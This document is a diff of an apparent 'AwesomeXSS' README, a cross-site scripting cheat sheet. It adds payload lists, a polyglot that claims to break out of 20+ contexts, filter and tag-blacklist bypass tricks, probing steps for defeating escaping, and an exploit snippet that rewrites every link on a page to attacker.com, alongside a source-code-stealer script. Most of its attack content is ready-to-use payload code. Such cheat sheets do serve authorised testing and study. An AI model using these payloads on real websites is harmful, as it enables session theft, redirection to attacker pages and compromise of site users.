@@ -2,20 +2,11 @@
 Awesome XSS stuff.
 Put this repo on watch. I will be updating it regularly.
 
-### Awesome Books
-- [XSS Cheat Sheet By Brute Logic](https://leanpub.com/xss)
-
-### Awesome Websites
-- [brutelogic.com.br](http://brutelogic.com.br)
-- [respectxss.blogspot.in](https://respectxss.blogspot.in/)
-
 ### Awesome Challenges
 - [Google's XSS Challenge](https://xss-game.appspot.com/)
 - [prompt(1) to win](http://prompt.ml/)
 
 ### Awesome People
-- [Rodolfo Assis](https://twitter.com/brutelogic)
-- [Ashar Javed](https://twitter.com/soaj1664ashar)
 - [Somdev Sangwan](https://twitter.com/s0md3v) because I made this repo :3
 
 ### Awesome Reads & Presentations
@@ -29,12 +20,68 @@ Put this repo on watch. I will be updating it regularly.
 
 ### Awesome Tools
 - [XSStrike](https://github.com/UltimateHackers/XSStrike)
-- [KNOXSS](http://knoxss.me/)
+- [xsshunter.com](https://xsshunter.com)
 - [BeEF](https://github.com/beefproject/beef)
 - [JShell](https://github.com/UltimateHackers/JShell)
 
+### Awesome XSS Mind Maps
+A beutiful XSS mind map by Jack Masa, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/jackmasa-mind-map.png)
+
+### Awesome DOM XSS
+
+- Does your input go into a sink? `Vulnerable`
+- It doesn't? `Not vulnerable`
+
+**Source**: An input that could be controlled by an external (untrusted) source.
+
+```
+document.URL
+document.documentURI
+document.URLUnencoded (IE 5.5 or later Only)
+document.baseURI
+location
+location.href
+location.search
+location.hash
+location.pathname
+document.cookie
+document.referrer
+window.name
+history.pushState()
+history.replaceState()
+localStorage
+sessionStorage
+```
+
+**Sink**: A potentially dangerous method that could lead to a vulnerability. In this case a DOM Based XSS.
+
+```
+eval
+Function
+setTimeout
+setInterval
+setImmediate
+execScript
+crypto.generateCRMFRequest
+ScriptElement.src
+ScriptElement.text
+ScriptElement.textContent
+ScriptElement.innerText
+anyTag.onEventName
+document.write
+document.writeln
+anyElement.innerHTML
+Range.createContextualFragment
+window.location
+document.location
+```
+
+This comprehensive list of sinks and source is taken from [domxsswiki](https://github.com/wisec/domxsswiki).
+
 ### Awesome Payloads
 ```
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
 <details open ontoggle=confirm()>
 <script y="><">/*<script* */prompt()</script
 <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
@@ -54,10 +101,15 @@ Put this repo on watch. I will be updating it regularly.
 <x oncut=alert()>x
 <svg onload=write()>
 ```
-Here's an interesting XSS polyglot by [Ahmed Elsobky](https://github.com/0xsobky/):
+
+### Awesome Polyglots
+
+Here's an XSS polyglot that I made which can break out of 20+ contexts:
 ```
-jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
 ```
+
+Explanation of how it works, [here](https://github.com/s0md3v/AwesomeXSS/blob/master/Database/polyglot.png)
 
 ### Awesome Tags & Event Handlers
 - [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
@@ -82,13 +134,18 @@ video
 
 ### Awesome Context Breaking
 
-#### Simple Context
+#### HTML Context
+Case: `<tag>You searched for $input. </tag>`
+
 ```
 <svg onload=alert()>
 </tag><svg onload=alert()>
 ```
 
 #### Attribute Context
+
+Case: `<tag attribute="$input">`
+
 ```
 "><svg onload=alert()>
 "><svg onload=alert()><b attr="
@@ -97,6 +154,9 @@ video
 "autocous/onfocus="alert()
 ```
 #### JavaScript Context
+
+Case: `<script> var new something = '$input'; </script>`
+
 ```
 '-alert()-'
 '-alert()//'
@@ -122,6 +182,12 @@ new class extends confirm``{}
 ```
 
 ### Awesome Exploits
+##### Replace all links
+```javascript
+Array.from(document.getElementsByTagName("a")).forEach(function(i) {
+  i.href = "https://attacker.com";
+});
+```
 ##### Source Code Stealer
 ```javascript
 var request = new XMLHttpRequest();
@@ -141,21 +207,21 @@ A good compilation of advanced XSS exploits can be found [here](http://www.xss-p
 If nothing of this works, take a look at **Awesome Bypassing** section
 
 First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of refelections.
-<br>Now for attribute context, check if double quotes (") are being filtered by entering **x"d3v**. If it gets altered to **x&amp;quot;d3v**, chances are that proper security measures are in place. If this happens, try doing the same for single quotes (') by entering **x'd3v**, if it gets altered to **x&amp;apos;**, you are doomed. The only thing you can try is encoding.<br>
+<br>Now for attribute context, check if double quotes (") are being filtered by entering `x"d3v`. If it gets altered to `x&quot;d3v`, chances are that output is getting properly escaped. If this happens, try doing the same for single quotes (') by entering `x'd3v`, if it gets altered to `x&apos;`, you are doomed. The only thing you can try is encoding.<br>
 If the quotes are not being filtered, you can simply try payloads from **Awesome Context Breaking** section.
 <br>For javascript context, check which quotes are being used for example if they are doing
 ```
 variable = 'value' or variable = "value"
 ```
-Now lets say single quotes (') are in use, in that case enter **x'd3v**. If it gets altered to **x\\'d3v**, try escaping the backslash (\) by adding a backslash to your probe i.e. **x\\'d3v**. If it works use the following payload:
+Now lets say single quotes (') are in use, in that case enter `x'd3v`. If it gets altered to `x\\'d3v`, try escaping the backslash (\) by adding a backslash to your probe i.e. `x\\'d3v`. If it works use the following payload:
 ```
 \'-alert()//
 ```
-But if it gets altered to **x\\'d3v**, the only thing you can try is closing the script tag itself by using
+But if it gets altered to `x\\\\'d3v`, the only thing you can try is closing the script tag itself by using
 ```
 </script><svg onload=alert()>
 ```
-For simple HTML context, the probe is **x&gt;d3v**. If it gets altered to **x&amp;gt;d3v**, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potenial filters. The dummy tag I like to use is **x&lt;xxx&gt;**. If it gets stripped or altered in any way, it means the filter is looking for a pair of **<** and **>**. It can simply bypassed using
+For simple HTML context, the probe is `x<d3v`. If it gets altered to `x&gt;d3v`, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potenial filters. The dummy tag I like to use is `x<xxx>`. If it gets stripped or altered in any way, it means the filter is looking for a pair of `<` and `>`. It can simply bypassed using
 ```
 <svg onload=alert()//
 ```
@@ -211,6 +277,14 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 <x ondrag=aconfirm()>drag it
 ```
 
+- Bypass tag blackilisting
+```
+</ScRipT>
+</script
+</script/>
+</script x>
+```
+
 **Filter bypass procedure by [Rodolfo Assis](https://twitter.com/rodoassis)**
 ```
 <x onxxx=1
@@ -240,17 +314,48 @@ If the your dummy tags lands in the source code as it is, go for any of these pa
 ```
 
 ### Awesome Encoding
-Come back later
+
+|HTML|Char|Numeric|Description|Hex|CSS (ISO)|JS (Octal)|
+|----|----|-------|-----------|----|--------|----------|
+|`&quot;`|"|`&#34;`|quotation mark|u+0022|\0022|\42|
+|`&num;`|#|`&#35;`|number sign|u+0023|\0023|\43|
+|`&dollar;`|$|`&#36;`|dollar sign|u+0024|\0024|\44|
+|`&percnt;`|%|`&#37;`|percent sign|u+0025|\0025|\45|
+|`&amp;`|`&|`&#38;`|ampersand|u+0026|\0026|\46|
+|`&apos;`|'|`&#39;`|apostrophe|u+0027|\0027|\47|
+|`&lpar;`|(|`&#40;`|left parenthesis|u+0028|\0028|\50|
+|`&rpar;`|)|`&#41;`|right parenthesis|u+0029|\0029|\51|
+|`&ast;`|*|`&#42;`|asterisk|u+002A|\002a|\52|
+|`&plus;`|+|`&#43;`|plus sign|u+002B|\002b|\53|
+|`&comma;`|,|`&#44;`|comma|u+002C|\002c|\54|
+|`&minus;`|-|`&#45;`|hyphen-minus|u+002D|\002d|\55|
+|`&period;`|.|`&#46;`|full stop; period|u+002E|\002e|\56|
+|`&sol;`|/|`&#47;`|solidus; slash|u+002F|\002f|\57|
+|`&colon;`|:|`&#58;`|colon|u+003A|\003a|\72|
+|`&semi;`|;`|`&#59;`|semicolon|u+003B|\003b|\73|
+|`&lt;`|<|`&#60;`|less-than|u+003C|\003c|\74|
+|`&equals;`|=|`&#61;`|equals|u+003D|\003d|\75|
+|`&gt;`|>|`&#62;`|greater-than sign|u+003E|\003e|\76|
+|`&quest;`|?|`&#63;`|question mark|u+003F|\003f|\77|
+|`&commat;`|@|`&#64;`|at sign; commercial at|u+0040|\0040|\100|
+|`&lsqb;`|\[|`&#91;`|left square bracket|u+005B|\005b|\133|
+|`&bsol;`|/\|`&#92;`|backslash|u+005C|\005c|\134|
+|`&rsqb;`|]|`&#93;`|right square bracket|u+005D|\005d|\135|
+|`&Hat;`|^|`&#94;`|circumflex accent|u+005E|\005e|\136
+|`&lowbar;`|_|`&#95;`|low line|u+005F|\005f|\137|
+|`&grave;`|\`|`&#96;`|grave accent|u+0060|\0060|\u0060|
+|`&lcub;`|{|`&#123;`|left curly bracket|u+007b|\007b|\173|
+|`&verbar;`|\||`&#124;`|vertical bar|u+007c|\007c|\174|
+|`&rcub;`|}|`&#125;`|right curly bracket|u+007d|\007d|\175|
 
 ### Awesome Tips & Tricks
-- http(s):// can be shortened to // or /\\.
-- **document.cookie** can be shortened to **cookie**. It applies to other DOM objects as well.
-- alert and other pop-up functions don't need a value, so stop doing **alert('XSS')** and start doing **alert()**
-- You can use **//** to close a tag instead of **>**.
-- I have found that **confirm** is the least detected pop-up function so stop using **alert**.
-- Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use **&lt;script src=//14.rs&gt;** instead of **&lt;script src="//14.rs"&gt;**
-- The shortest independent "XSS" payload is **&lt;embed src=//14.rs&gt;** (19 chars)
+- `http(s)://` can be shortened to `//` or `/\\` or `\\`.
+- `document.cookie` can be shortened to `cookie`. It applies to other DOM objects as well.
+- alert and other pop-up functions don't need a value, so stop doing `alert('XSS')` and start doing `alert()`
+- You can use `//` to close a tag instead of `>`.
+- I have found that `confirm` is the least detected pop-up function so stop using `alert`.
+- Quotes around attribute value aren't neccessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
+- The shortest independent XSS payload is `script src=//14.rs` (19 chars)
 
 ### Awesome Credits
 All the payloads are crafted by me unless specified.
-Thanks to my big brother [Rodolfo Assis](https://twitter.com/rodoassis) whose writings inspired me to become an XSSLord.
